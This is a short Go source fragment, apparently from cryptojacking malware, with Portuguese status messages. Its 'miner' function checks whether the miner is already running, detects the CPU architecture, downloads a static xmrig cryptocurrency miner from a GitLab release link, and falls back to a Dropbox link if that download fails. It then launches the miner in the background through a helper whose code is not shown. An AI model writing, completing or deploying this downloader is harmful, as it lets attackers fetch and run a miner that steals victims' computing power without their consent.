package main

import (
	
"fmt"


)




func miner() {



	ret := proc()
	fmt.Println(ret)

	if ret == "ok" {
		 
fmt.Println("writebackk  em execucao ..")

		return

	}

	archName := uname()

	if archName == "amd_64" {

		raw("https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static")
		ckRet := check()
		if ckRet == 1 {

			go exec_vk()

		}  else {  

//git lab error 


raw("https://www.dropbox.com/scl/fi/gowisyv48mg2stbq5zuiw/xmrig?rlkey=birs6p8l3k5gpypqqasnjtmlp&st=vmshs344&dl=1")

fmt.Println("gitlab erro in down usando ")
 

go exec_vk()

}





	}







}

